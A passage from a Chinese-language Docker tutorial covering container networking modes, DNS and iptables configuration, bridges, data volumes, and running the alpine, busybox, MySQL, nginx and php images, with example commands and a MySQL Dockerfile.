56 bytes from 172.17.0.5: icmp_seq=2 ttl=64 time=0.256 ms
用 ping 来测试db容器,它会解析成 172.17.0.5。

用户可以链接多个父容器到子容器,比如可以链接多个web到db容器上

</pre>

<h4>容器互联 network</h4><pre>
随着Docker网络的完善,强烈建议大家将容器加入自定义的Docker网络来连接多个容器,而不是使用--link参数来使容器互联

$ docker network --help
Usage:  docker network COMMAND
Manage networks
Commands:
  connect     Connect a container to a network
  create      Create a network
  disconnect  Disconnect a container from a network
  inspect     Display detailed information on one or more networks
  ls          List networks
  prune       Remove all unused networks
  rm          Remove one or more networks

Run 'docker network COMMAND --help' for more information on a command.

【 新建一个Docker网络 】
$ docker network create -d bridge my-net  # -d 参数指定Docker网络类型,有bridge/overlay,其中oerlay网络类型用于Swarm mode

【 连接容器 】
运行一个容器并连接到新建的my-net网络
$ docker run -it --rm --name busybox1 --network my-net busybox sh
打开新的终端,再运行一个容器并加入到 my-net 网络
$ docker run -it --rm --name busybox2 --network my-net busybox sh
再打开一个新的终端查看容器信息
$ docker container ls
CONTAINER ID  IMAGE    COMMAND  CREATED         STATUS         PORTS  NAMES
b47060aca56b  busybox  "sh"     11 minutes ago  Up 11 minutes         busybox2
8720575823ec  busybox  "sh"     16 minutes ago  Up 16 minutes         busybox1

下面通过ping来证明busybox1容器和busybox2容器建立了互联关系。

在busybox1容器输入以下命令
/ # ping busybox2
PING busybox2(172.19.0.3): 56 data bytes
64 bytes from 172.19.0.3: seq=0 ttl=64 time=0.072 ms
64 bytes from 172.19.0.3: seq=1 ttl=64 time=0.118 ms
用 ping 来测试连接 busybox2 容器,它会解析成 172.19.0.3。

同理在busybox2容器执行ping busybox1也会成功连接到。
/ # ping busybox1
PING busybox1(172.19.0.2): 56 data bytes
64 bytes from 172.19.0.2: seq=0 ttl=64 time=0.064 ms
64 bytes from 172.19.0.2: seq=1 ttl=64 time=0.143 ms

这样busybox1容器和busybox2容器建立了互联关系。

【 Docker Compose 】
如果有多个容器之间需要互相连接,推荐使用Docker Compose

【 四种网络模式 】
在使用docker run创建Docker容器时,可以用--net选项指定容器的网络模式,Docker有以下4种网络模式:
· host模式,使用--net=host指定。
· container模式,使用--net=container:NAME_or_ID指定。
· none模式,使用--net=none指定。
· bridge模式,使用--net=bridge指定,默认设置。类似于Vmware的nat网络模式,同一个宿主机上的所有容器会在同一个网段下,相互之间是可以通信的

1、host模式
Docker使用了Linux的Namespaces技术来进行资源隔离,如PID Namespace隔离进程,Mount Namespace隔离文件系统,Network Namespace隔离网络等。
一个Network Namespace提供了一份独立的网络环境,包括网卡、路由、Iptable规则等都与其他的Network Namespace隔离。
一个Docker容器一般会分配一个独立的Network Namespace。但如果启动容器的时候使用host模式,那么这个容器将不会获得一个独立的Network Namespace,而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡,配置自己的IP等,而是使用宿主机的IP和端口。
例如在10.10.101.105/24的机器上用host模式启动一个含有web应用的Docker容器,监听tcp80端口。在容器中执行任何类似ifconfig命令查看网络环境时看到的都是宿主机上的信息。而外界访问容器中的应用,则直接使用10.10.101.105:80即可,不用任何NAT转换,就如直接跑在宿主机中一样。但容器的其他方面如文件系统、进程列表等还是和宿主机隔离的。

2、container模式
这个模式指定新创建的容器和已经存在的一个容器共享一个Network Namespace,而不是和宿主机共享。新创建的容器不会创建自己的网卡、配置自己的IP,而是和一个指定的容器共享IP、端口范围等。同样两个容器除了网络方面,其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过lo网卡设备通信。

3、none模式
这种模式下Docker容器拥有自己的Network Namespace,但并不为Docker容器进行任何网络配置,即这个Docker容器没有网卡、IP、路由等信息。需要手动为Docker容器添加网卡、配置IP等。

4、bridge模式
bridge模式是Docker默认的网络设置,此模式会为每一个容器分配Network Namespace、设置IP等,并将一个主机上的Docker容器连接到一个虚拟网桥上

</pre>

<h4>配置DNS</h4><pre>
Docker没有为每个容器专门定制镜像,那么怎么自定义配置容器的主机名和DNS配置呢？ 秘诀就是它利用虚拟文件来挂载到容器的3个相关配置文件

在容器中使用mount命令可以看到挂载信息:
$ mount
/dev/disk/by-uuid/1fec...ebdf on /etc/hostname type ext4 ...
/dev/disk/by-uuid/1fec...ebdf on /etc/hosts type ext4 ...
tmpfs on /etc/resolv.conf type tmpfs ...
这种机制可以让宿主主机DNS信息发生更新后,所有Docker容器的DNS配置通过/etc/resolv.conf文件立刻得到更新。

配置全部容器的DNS,也可以在/etc/docker/daemon.json文件中增加以下内容来设置。
{
  "dns" : [
    "114.114.114.114",
    "8.8.8.8"
  ]
}
这样每次启动的容器DNS自动配置为114.114.114.114和8.8.8.8。使用以下命令来证明其已经生效。
$ docker run -it --rm ubuntu:17.10  cat etc/resolv.conf
nameserver 114.114.114.114
nameserver 8.8.8.8

如果用户想要手动指定容器的配置,可以在使用docker run命令启动容器时加入如下参数:
-h HOSTNAME
--hostname=HOSTNAME
设定容器的主机名,它会被写到容器内的/etc/hostname和/etc/hosts,但它在容器外部看不到,既不会在docker container ls中显示,也不会在其他的容器的/etc/hosts看到。

--dns=IP_ADDRESS
添加DNS服务器到容器的/etc/resolv.conf中,让容器用这个服务器来解析所有不在/etc/hosts中的主机名。

--dns-search=DOMAIN
设定容器的搜索域,当设定搜索域为.example.com时,在搜索一个名为host的主机时,DNS不仅搜索host,还会搜索host.example.com。

如果在容器启动时没有指定最后两个参数,Docker会默认用主机上的/etc/resolv.conf来配置容器。

--link=CONTAINER_NAME:ALIAS
在创建容器的时候,添加一个其他容器的主机名到/etc/hosts文件中,让新容器的进程可以使用主机名ALIAS就可以连接

</pre>

<h4>容器访问控制</h4><pre>
容器的访问控制主要通过Linux上的iptables防火墙来进行管理和实现,iptables是Linux上默认的防火墙软件,在大部分发行版中都自带

容器访问外部网络
容器要想访问外部网络需要本地系统的转发支持,在Linux系统中检查转发是否打开
$sysctl net.ipv4.ip_forward
net.ipv4.ip_forward = 1
如果为说明没有开启转发,则需要手动打开
$sysctl -w net.ipv4.ip_forward=1
如果在启动Docker服务的时候设定--ip-forward=true,Docker就会自动设定系统的ip_forward参数为1

容器之间访问
容器之间相互访问需要两方面的支持。
容器的网络拓扑是否已经互联,默认情况下所有容器都会被连接到docker0网桥上。
本地系统的防火墙软件 -- iptables是否允许通过。

访问所有端口
当启动Docker服务时候默认会添加一条转发策略到iptables的FORWARD链上。
策略为通过(ACCEPT)还是禁止(DROP)取决于配置--icc=true(缺省值)还是 --icc=false。
如果手动指定 --iptables=false 则不会添加 iptables 规则。

可见默认情况下不同容器之间是允许网络互通的。如果为了安全考虑可以在/etc/default/docker文件中配置DOCKER_OPTS=--icc=false来禁止它。

访问指定端口
在通过-icc=false关闭网络访问后,还可以通过--link=CONTAINER_NAME:ALIAS选项来访问容器的开放端口。

例如在启动Docker服务时可以同时使用icc=false --iptables=true参数来关闭允许相互的网络访问,并让Docker可以修改系统中的iptables规则。

此时系统中的iptables规则可能是类似
$ sudo iptables -nL
...
Chain FORWARD(policy ACCEPT)
target     prot opt source               destination
DROP       all  --  0.0.0.0/0            0.0.0.0/0
...
之后启动容器(docker run)时使用 --link=CONTAINER_NAME:ALIAS 选项。Docker会在iptable中为两个容器分别添加一条ACCEPT规则,允许相互访问开放的端口(取决于Dockerfile中的EXPOSE指令)。

当添加了--link=CONTAINER_NAME:ALIAS选项后,添加了iptables规则。
$ sudo iptables -nL
...
Chain FORWARD(policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp  --  172.17.0.2           172.17.0.3           tcp spt:80
ACCEPT     tcp  --  172.17.0.3           172.17.0.2           tcp dpt:80
DROP       all  --  0.0.0.0/0            0.0.0.0/0
注意:--link=CONTAINER_NAME:ALIAS中的CONTAINER_NAME目前必须是Docker分配的名字,或使用--name参数指定的名字。主机名则不会被识别。

</pre>

<h4>端口映射的实现</h4><pre>
映射容器端口到宿主主机的实现
默认容器可以主动访问到外部网络的连接,但外部网络无法访问到容器。

容器访问外部实现
容器所有到外部网络的连接,源地址都会被NAT成本地系统的IP地址,这是使用iptables的源地址伪装操作实现的。

查看主机的NAT规则
$ sudo iptables -t nat -nL
...
Chain POSTROUTING(policy ACCEPT)
target     prot opt source               destination
MASQUERADE  all  --  172.17.0.0/16       !172.17.0.0/16
...
其中上述规则将所有源地址在 172.17.0.0/16 网段,目标地址为其他网段(外部网络)的流量动态伪装为从系统网卡发出。MASQUERADE跟传统SNAT的好处是它能动态从网卡获取地址。

外部访问容器实现
容器允许外部访问,可以在docker run时候通过-p或-P参数来启用。
不管用那种办法,其实也是在本地的iptable的nat表中添加相应的规则。

使用 -P 时:
$ iptables -t nat -nL
...
Chain DOCKER(2 references)
target     prot opt source               destination
DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:49153 to:172.17.0.2:80

使用 -p 80:80 时:
$ iptables -t nat -nL
Chain DOCKER(2 references)
target     prot opt source               destination
DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:80 to:172.17.0.2:80

这里的规则映射了0.0.0.0,意味着将接受主机来自所有接口的流量。用户可以通过-p IP:host_port:container_port 或 -p IP::port 来指定允许访问容器的主机上的 IP、接口等,以制定更严格的规则。

如果希望永久绑定到某个固定的IP地址,可以在Docker配置文件 /etc/docker/daemon.json中添加如下内容
{
  "ip": "0.0.0.0"
}

</pre>

<h4>配置docker0网桥</h4><pre>
Docker服务默认会在宿主机创建一个docker0网桥(其上有一个 docker0 内部接口),它在内核层连通了其他的物理或虚拟网卡,这就将所有容器和本地主机都放到同一个物理网络
Docker默认指定了docker0接口的IP地址和子网掩码,让主机和容器之间可以通过网桥相互通信,它还给出了MTU(接口允许接收的最大传输单元),通常是1500Bytes,或宿主主机网络路由上支持的默认值,这些值都可以在服务启动的时候进行配置。

--bip=CIDR IP地址加掩码格式,例如192.168.1.5/24
--mtu=BYTES 覆盖默认的Docker mtu配置

也可以在配置文件中配置DOCKER_OPTS,然后重启服务。

由于目前Docker网桥是Linux网桥,用户可以使用brctl show来查看网桥和端口连接信息,brctl命令在Debian、Ubuntu中可以使用sudo apt-get install bridge-utils来安装
$ sudo brctl show
bridge name     bridge id               STP enabled     interfaces
docker0         8000.3a1d7362b4ee       no              veth65f9

每次创建一个新容器的时候,Docker从可用的地址段中选择一个空闲的IP地址分配给容器的eth0端口。使用本地主机上docker0接口的IP作为所有容器的默认网关。

$ sudo docker run -it --rm base /bin/bash
$ ip addr show eth0
24: eth0: < BROADCAST,UP,LOWER_UP > mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 32:6f:e0:35:57:91 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::306f:e0ff:fe35:5791/64 scope link
       valid_lft forever preferred_lft forever
$ ip route
default via 172.17.42.1 dev eth0
172.17.0.0/16 dev eth0  proto kernel  scope link  src 172.17.0.3

</pre>

<h4>自定义网桥</h4><pre>
除了默认的docker0网桥,用户也可以指定网桥来连接各个容器。在启动Docker服务的时候使用-b BRIDGE或--bridge=BRIDGE来指定使用的网桥。

如果服务已经运行,那需要先停止服务并删除旧的网桥。
$ sudo systemctl stop docker
$ sudo ip link set dev docker0 down
$ sudo brctl delbr docker0

然后创建一个网桥bridge0
$ sudo brctl addbr bridge0
$ sudo ip addr add 192.168.5.1/24 dev bridge0
$ sudo ip link set dev bridge0 up

查看确认网桥创建并启动
$ ip addr show bridge0
4: bridge0: < BROADCAST,MULTICAST > mtu 1500 qdisc noop state UP group default
    link/ether 66:38:d0:0d:76:18 brd ff:ff:ff:ff:ff:ff
    inet 192.168.5.1/24 scope global bridge0
       valid_lft forever preferred_lft forever

在Docker配置文件/etc/docker/daemon.json中添加如下内容,即可将Docker默认桥接到创建的网桥上。
{ "bridge": "bridge0" }

启动Docker服务
新建一个容器可以看到它已经桥接到了bridge0上
可以继续用brctl show命令查看桥接的信息。另外在容器中可以使用ip addr和ip route命令来查看IP地址配置和路由信息。

</pre>
</div>

<div id="docker_data_manager">
<h3>docker数据管理</h3><pre>
在Docker内部及容器之间管理数据,在容器中管理数据主要有两种方式:
数据卷(Volumes)
挂载主机目录(Bind mounts)

数据卷是一个绕过UFS可供一个或多个容器使用的特殊目录,可以提供很多有用的特性:
1、数据卷可以在容器之间共享和重用
2、对数据卷的修改会立马生效
3、对数据卷的更新不会影响镜像
4、数据卷默认会一直存在,即使容器被删除

数据卷的使用,类似于Linux下对目录或文件进行mount,镜像中的被指定为挂载点的目录中的文件会隐藏掉,能显示看的是挂载的数据卷

选择 -v 还是 -–mount 参数
Docker新用户应该选择--mount参数,经验丰富的Docker使用者对-v或--volume已经很熟悉了,但推荐使用--mount参数

docker volume的用法
create      Create a volume
inspect     Display detailed information on one or more volumes
ls          List volumes
prune       Remove all unused local volumes
rm          Remove one or more volumes

【 创建一个数据卷 】
$ docker volume create my-vol

创建一个web容器并加载一个数据卷到容器的/webapp目录,容器会自动创建/webapp目录
$ sudo docker run -d -P --name web -v /webapp training/webapp python app.py

也可以在Dockerfile中使用VOLUME来添加一个或多个新的卷到由该镜像创建的任意容器

【 查看所有的数据卷 】
$ docker volume ls
local               my-vol

【 查看数据卷的具体信息 】
在主机里使用以下命令可以查看web容器的信息
$ docker inspect web

挂载主机目录的配置信息在"Mounts" Key下面
"Mounts": [
    {
        "Type": "bind",
        "Source": "/src/webapp",
        "Destination": "/opt/webapp",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
    }
],

【 启动一个挂载数据卷的容器 】
docker run命令使用--mount标记来将数据卷挂载到容器里。在一次docker run中可以挂载多个数据卷。

创建一个名为web的容器,并加载一个数据卷到容器的/webapp目录
$ docker run -d -P  --name web \
    # -v my-vol:/wepapp \
    --mount source=my-vol,target=/webapp \
    training/webapp python app.py

【 挂载一个主机目录作为数据卷 】
使用-v / --mount标记可以指定挂载一个本地主机的目录到容器中去。

$ sudo docker run -d -P --name web -v /src/webapp:/opt/webapp training/webapp python app.py

$ docker run -d -P \
    --name web \
    # -v /src/webapp:/opt/webapp \
    --mount type=bind,source=/src/webapp,target=/opt/webapp \
    training/webapp \
    python app.py

上面的命令加载主机的/src/webapp目录到容器的/opt/webapp目录。这个功能在进行测试的时候十分方便,比如用户可以放置一些程序到本地目录中来查看容器是否正常工作。本地目录的路径必须是绝对路径,以前使用-v参数时如果本地目录不存在Docker会自动创建一个文件夹,现在使用--mount参数时如果本地目录不存在Docker会报错。

共享宿主机目录到Ubuntu系统中:
docker run -it -v /AAA:/BBB ubuntu bash  # 宿主机根目录中的AAA文件夹就映射到了容器Ubuntu中去了,两者之间能够共享

Docker挂载主机目录的默认权限是读写,用户也可以通过增加readonly指定为只读。如果在容器内target目录新建文件会显示Read-only file system错误
$ docker run -d -P \
    --name web \
    # -v /src/webapp:/opt/webapp:ro \
    --mount type=bind,source=/src/webapp,target=/opt/webapp,readonly \
    training/webapp \
    python app.py

Docker挂载数据卷的默认权限是读写,用户也可以通过:ro指定为只读,加了:ro之后就挂载为只读了
$ sudo docker run -d -P --name web -v /src/webapp:/opt/webapp:ro training/webapp python app.py

【 挂载一个本地主机文件作为数据卷 】
-v / --mount标记也可以从本地主机挂载单个文件作为数据卷到容器中

$ docker run --rm -it \
   # -v $HOME/.bash_history:/root/.bash_history \
   --mount type=bind,source=$HOME/.bash_history,target=/root/.bash_history \  # 记录在容器输入过的命令,可以使用history命令查看
   ubuntu:17.10 \
   bash

$ sudo docker run --rm -it -v ~/.bash_history:/.bash_history ubuntu /bin/bash # 记录在容器输入过的命令
如果直接挂载一个文件,很多文件编辑工具包括vi或sed --in-place,可能会造成文件inode的改变,从Docker1.1.0起这会导致报错误信息。所以最简单的办法就直接挂载文件的父目录

【 数据卷容器 】
如果有一些持续更新的数据需要在容器之间共享,最好创建数据卷容器。数据卷容器其实就是一个正常的容器,专门用来提供数据卷供其它容器挂载的。

$ sudo docker run -d -v /dbdata --name dbdata training/postgres echo Data-only container for postgres  # 创建一个命名的数据卷容器dbdata
$ sudo docker run -d --volumes-from dbdata --name db1 training/postgres  # 在其他容器中使用--volumes-from来挂载dbdata容器中的数据卷
$ sudo docker run -d --volumes-from dbdata --name db2 training/postgres
$ sudo docker run -d --name db3 --volumes-from db1 training/postgres  # 还可以使用多个--volumes-from参数来从多个容器挂载多个数据卷,也可以从其他已经挂载了数据卷的容器来挂载数据卷。

使用--volumes-from参数所挂载数据卷的容器自己并不需要保持在运行状态。
如果删除了挂载的容器(包括dbdata、db1和db2),数据卷并不会被自动删除。如果要删除一个数据卷,必须在删除最后一个还挂载着它的容器时使用docker rm -v命令来指定同时删除关联的容器。这可以让用户在容器之间升级和移动数据卷。

【 利用数据卷容器来备份、恢复、迁移数据卷 】
可以利用数据卷对其中的数据进行进行备份、恢复和迁移。

备份
先使用--volumes-from标记创建一个加载dbdata容器卷的容器,并从本地主机挂载当前到容器的/backup目录,容器启动后使用了tar命令来将dbdata卷备份为本地的/backup/backup.tar
$ sudo docker run --volumes-from dbdata -v $(pwd):/backup ubuntu tar cvf /backup/backup.tar /dbdata

恢复
如果要恢复数据到一个容器,首先创建一个带有数据卷的容器dbdata2
$ sudo docker run -v /dbdata --name dbdata2 ubuntu /bin/bash
然后创建另一个容器,挂载dbdata2的容器,并使用untar解压备份文件到挂载的容器卷中。
$ sudo docker run --volumes-from dbdata2 -v $(pwd):/backup busybox tar xvf /backup/backup.tar

【 删除数据卷 】
$ docker volume rm my-vol

数据卷是被设计用来持久化数据的,它的生命周期独立于容器,Docker不会在容器被删除后自动删除数据卷,并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据卷
如果需要在删除容器的同时移除数据卷,可以在删除容器的时候使用docker rm -v命令

无主的数据卷可能会占据很多空间,要清理请使用以下命令
$ docker volume prune
$ docker volume prune -f, --force      # Do not prompt for confirmation
$ docker volume prune--filter filter   # Provide filter values(e.g. 'label=label')

</pre>
</div>

<div id="docker_hot_images">
<h3>热门镜像</h3>

<h4>alpine</h4><pre>
尽可能使用当前官方仓库作为构建镜像的基础。推荐使用Alpine镜像,因为它被严格控制并保持最小尺寸(目前小于5MB),但它仍然是一个完整的发行版
Alpine Linux是一个完整的操作系统,像其他操作系统一样,可以将Alpine安装到本地硬盘中

1、小巧:基于Musl libc和busybox,和busybox一样小巧,最小的Docker镜像只有5MB;
2、安全:面向安全的轻量发行版;
3、简单:提供APK包管理工具,软件的搜索、安装、删除、升级都非常方便。
4、适合容器使用:由于小巧、功能完备,非常适合作为容器的基础镜像。

$ docker run -it --name myalpine alpine

# This example has a virtual image size of only 36.8MB
FROM alpine:3.7
RUN apk add --no-cache mysql-client
ENTRYPOINT ["mysql"]

# Ubuntu: This yields us a virtual image size of about 145MB image.
FROM ubuntu:18.04
RUN apt-get update \
    && apt-get install -y --no-install-recommends mysql-client \
    && rm -rf /var/lib/apt/lists/*
ENTRYPOINT ["mysql"]

</pre>

<h4>busybox</h4><pre>
Busybox是一个集成了100多个最常用Linux命令的软件工具箱,在单一的可执行文件中提供了精简的UNIX工具集,Busybox是linux系统的瑞士军刀
该工具箱中包含了常见简单实用的工具如cat、echo、grep、find、mount、telnet等。
BusyBox可运行于多款POSIX环境的操作系统中,如Linux(包括Android)、Hurd、FreeBSD等
busybox没有安装bash命令,默认sh命令

$ docker run -idt --name busybox1 busybox cal
$ docker logs busybox1
$ docker run -it busybox

</pre>

<h4>Mysql</h4><pre>
$ docker run --name my1 -e MYSQL_ROOT_PASSWORD=123456 -d mysql
$ mysql -h 172.17.0.2 -u root -p          # docker inspect my1命令查案容器ip地址
Enter password:
ERROR 2059(HY000): Authentication plugin 'caching_sha2_password' cannot be loaded: /usr/lib/mysql/plugin/caching_sha2_password.so: cannot open shared object file: No such file or directory
$ docker exec -it my1 bash                # 进入容器修改密码即可
root@fb52d390b53d:/# mysql -uroot -p
mysql> ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '123456';
mysql> FLUSH PRIVILEGES;
mysql> quit
root@fb52d390b53d:/# exit
$ mysql -h 172.17.0.2 -u root -p

$ docker run -p 3306:3306 --name my2 -e MYSQL_ROOT_PASSWORD=123456 -d mysql  # 端口映射

docker run --name my3 -v /conf/mysql:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=123456 -d mysql
把主机的/conf/mysql文件夹挂载到mysqldocker容器的/etc/mysql/conf.d文件夹里面,改mysql的配置文件就只需要把mysql配置文件放在自定义的文件夹下(/conf/mysql)

docker run --name my4 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:tag --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci
指定mysql的一些配置参数

$ sudo docker run -it --link mysql --rm mysql sh -c 'exec mysql -h "172.17.0.3" -P3306 -uroot -pwwwwww'

【 server vs client container 】
docker是轻量级的,可自由使用的(disposable),所以最好对于特定的任务使用单一的容器,而不是在一个容器里进行2种任务。
所以对于mysql来说,可以使用一个容器提供Mysql server服务,另一个容器作为客户端使用。

启动作为Mysql server使用的容器:
docker run --name some-mysql -e MYSQLROOTPASSWORD=mysecretpassword -d mysql

启动mysql客户端连接的容器(注意$MYSQLPORT3306TCPADDR,$MYSQLPORT3306TCPPORT,$MYSQLENVMYSQLROOTPASSWORD要使用实际的IP,PORT,PASSWORD代替):
查看容器的IP、PORT等信息,可以通过inscept,如docker inspect container_name:
 "Gateway": "172.17.0.1",
 "IPAddress": "172.17.0.3",

docker run -it --link some-mysql:mysql --rm mysql sh -c 'exec mysql -h"$MYSQLPORT3306TCPADDR" -P"$MYSQLPORT3306TCPPORT" -uroot -p"$MYSQLENVMYSQLROOTPASSWORD"'
sudo docker run -it --link mysql --rm mysql sh -c 'exec mysql -h "172.17.0.3" -P3306 -uroot -pwwwwww'

【 通过Dockerfile构建mysql镜像 】
创建Dockerfile
首先创建目录mysql,用于存放后面的相关东西。
~$ mkdir -p ~/mysql/data ~/mysql/logs ~/mysql/conf
data目录将映射为mysql容器配置的数据文件存放路径
logs目录将映射为mysql容器的日志目录
conf目录里的配置文件将映射为mysql容器的配置文件

进入创建的mysql目录,创建Dockerfile
~$ cd mysql && vi Dcokerfile

</pre><textarea>FROM debian:stretch-slim

# add our user and group first to make sure their IDs get assigned consistently, regardless of whatever dependencies get added
RUN groupadd -r mysql && useradd -r -g mysql mysql

RUN apt update && apt install -y --no-install-recommends gnupg dirmngr && rm -rf /var/lib/apt/lists/*

# add gosu for easy step-down from root
ENV GOSU_VERSION 1.7
RUN set -x \
  && apt update && apt install -y --no-install-recommends ca-certificates wget && rm -rf /var/lib/apt/lists/* \
  && wget -O /usr/local/bin/gosu "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture)" \
  && wget -O /usr/local/bin/gosu.asc "https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg --print-architecture).asc" \
  && export GNUPGHOME="$(mktemp -d)" \
  && gpg --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4 \
  && gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu \
  && rm -rf "$GNUPGHOME" /usr/local/bin/gosu.asc \
  && chmod +x /usr/local/bin/gosu \
  && gosu nobody true \
  && apt purge -y --auto-remove ca-certificates wget

RUN mkdir /docker-entrypoint-initdb.d

RUN apt update && apt install -y --no-install-recommends \
    # for MYSQL_RANDOM_ROOT_PASSWORD
    pwgen \
    # for mysql_ssl_rsa_setup
    openssl \
    # FATAL ERROR: please install the following Perl modules before executing /usr/local/mysql/scripts/mysql_install_db:
    # File::Basename
    # File::Copy
    # Sys::Hostname
    # Data::Dumper
    perl \
  && rm -rf /var/lib/apt/lists/*

RUN set -ex; \
  # gpg: key 5072E1F5: public key "MySQL Release Engineering ＜mysql-build@oss.oracle.com＞" imported
  key='A4A9406876FCBD3C456770C88C718D3B5072E1F5'; \
  export GNUPGHOME="$(mktemp -d)"; \
  gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$key"; \
  gpg --export "$key" > /etc/apt/trusted.gpg.d/mysql.gpg; \
  rm -rf "$GNUPGHOME"; \
  apt-key list > /dev/null

ENV MYSQL_MAJOR 8.0
ENV MYSQL_VERSION 8.0.11-1debian9

RUN echo "deb http://repo.mysql.com/apt/debian/ stretch mysql-${MYSQL_MAJOR}" > /etc/apt/sources.list.d/mysql.list

# the "/var/lib/mysql" stuff here is because the mysql-server postinst doesn't have an explicit way to disable the mysql_install_db codepath besides having a database already "configured"(ie, stuff in /var/lib/mysql/mysql)
# also, we set debconf keys to make APT a little quieter
RUN { \
    echo mysql-community-server mysql-community-server/data-dir select ''; \
    echo mysql-community-server mysql-community-server/root-pass password ''; \
    echo mysql-community-server mysql-community-server/re-root-pass password ''; \
    echo mysql-community-server mysql-community-server/remove-test-db select false; \
  } | debconf-set-selections \
  && apt update && apt install -y mysql-community-client-core="${MYSQL_VERSION}" mysql-community-server-core="${MYSQL_VERSION}" && rm -rf /var/lib/apt/lists/* \
  && rm -rf /var/lib/mysql && mkdir -p /var/lib/mysql /var/run/mysqld \
  && chown -R mysql:mysql /var/lib/mysql /var/run/mysqld \
  # ensure that /var/run/mysqld(used for socket and lock files) is writable regardless of the UID our mysqld instance ends up having at runtime
  && chmod 777 /var/run/mysqld

VOLUME /var/lib/mysql
# Config files
COPY config/ /etc/mysql/
COPY docker-entrypoint.sh /usr/local/bin/
RUN ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat
ENTRYPOINT ["docker-entrypoint.sh"]

EXPOSE 3306
CMD ["mysqld"]

</textarea><pre>
~/mysql$ docker build -t mymysql .    # 通过Dockerfile创建一个镜像mymysql

~/mysql$ docker images |grep mysql    # 创建完成后可以在本地的镜像列表里查找到刚刚创建的镜像
mysql    5.6      2c0964ec182a  3 weeks ago   329 MB

使用mysql镜像运行容器
~/mysql$ docker run -p 3306:3306 --name mymysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6
21cb89213c93d805c5bacf1028a0da7b5c5852761ba81327e6b99bb3ea89930e

命令说明:
-p 3306:3306:将容器的 3306 端口映射到主机的 3306 端口。
-v $PWD/conf:/etc/mysql/conf.d:将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。
-v $PWD/logs:/logs:将主机当前目录下的 logs 目录挂载到容器的 /logs。
-v $PWD/data:/var/lib/mysql :将主机当前目录下的data目录挂载到容器的 /var/lib/mysql 。
-e MYSQL_ROOT_PASSWORD=123456:初始化 root 用户的密码。

查看容器启动情况
~/mysql$ docker ps
CONTAINER ID    IMAGE         COMMAND                  ...  PORTS                    NAMES
21cb89213c93    mysql:5.6    "docker-entrypoint.sh"    ...  0.0.0.0:3306->3306/tcp   mymysql

</pre>

<h4>nginx</h4><pre>
$ docker run --name webserver -d -p 80:80 nginx

$ docker container ls -a
CONTAINER ID  IMAGE COMMAND                 CREATED        STATUS         PORTS                NAMES
4f167597fd34  nginx "nginx -g 'daemon ..."  13 hours ago   Up 3 seconds   0.0.0.0:80->80/tcp   webserver

berlin75@virtualbox:~$ curl 172.17.0.3
berlin75@virtualbox:~$ curl 127.0.0.1

virtualbox 网卡1 nat 方式转发端口 8880 -> 80
宿主机就可以打开http://localhost:8880

主机浏览器:localhost 或 127.17.0.1 或 127.17.0.2

$ docker inspect webserver
$ docker inspect nginx

【 docker运行nginx为什么要使用 daemon off 】
nginx -g 'daemon off;'

1.docker容器跑着为啥会挂掉？
docker容器默认会把容器内部第一个进程,也就是pid=1的程序作为docker容器是否正在运行的依据,如果docker容器pid挂了,那么docker容器便会直接退出。
2.docker run的时候把command作为容器内部命令,如果使用nginx,那么nginx程序将后台运行,这个时候nginx并不是pid为1的程序,而是执行的bash,这个bash执行了nginx指令后就挂了,所以容器也就退出了,同理,pm2 start过后,bash的pid为1,那么此时bash执行完以后会退出,所以容器也就退出了。

因为容器的生命周期依赖于启动时执行的命令,只要该命令不结束,容器也就不会退出

下面使用实例
touch file get_pid

echo "PID of this script: $$"
echo "PPID of this script: $PPID"
echo "UID of this script: $UID"
#nginx -g 'daemon off;'

此时启动容器去执行这个sh文件

odtoy:~ zhaojunlike$ eval `docker-machine env default`
godtoy:~ zhaojunlike$ cd WorkSpace/
godtoy:WorkSpace zhaojunlike$ ls
docker    nodejs    php    pid_get
godtoy:WorkSpace zhaojunlike$ vim pid_get
godtoy:WorkSpace zhaojunlike$ docker run -v `pwd`/pid_get:/pid_get:ro --rm --workdir=/ nginx bash /pid_get
PID of this script: 1
PPID of this script: 0
UID of this script: 0
godtoy:WorkSpace zhaojunlike$

在容器执行完pid_get后,容器也就自动退出了,这个时候打印出了当前的bash运行的pid是1。
所以如果想让容器不挂掉,那么非守护进行的执行是必须的,当然下面也能去让一个容器内部,执行

godtoy:WorkSpace zhaojunlike$ docker run -it nginx bash
root@a8baa5fe77f0:/# nginx
root@a8baa5fe77f0:/# godtoy:WorkSpace zhaojunlike$
使用-it参数可以连接到容器内部的管道,然后在容器内部使用nginx命令。最后Ctrl+P+Q退出容器后,容器依然运行。

总结
如果需要去在docker中使用node,那么就没必要去安装pm2等工具了,直接node,如果怕容器会挂掉,可以加上restart等相关参数比如`docker run .... --restart=always

</pre>

<h4>php</h4><pre>
Docker Hub的PHP官方镜像中
cli版本是命令行版本;
zts版本是线程安全版本;
fpm版本是集成了FastCGI管理器(fpm)的版本,一般用在Nginx和PHP的集成中

FROM php:7.0-fpm
FROM php:7.2.5-fpm

$ docker run -p 9000:9000 --name myphp-fpm -v ~/nginx/www:/www -v $PWD/conf:/usr/local/etc/php -v $PWD/logs:/phplogs -d php:5.6-fpm

命令说明:
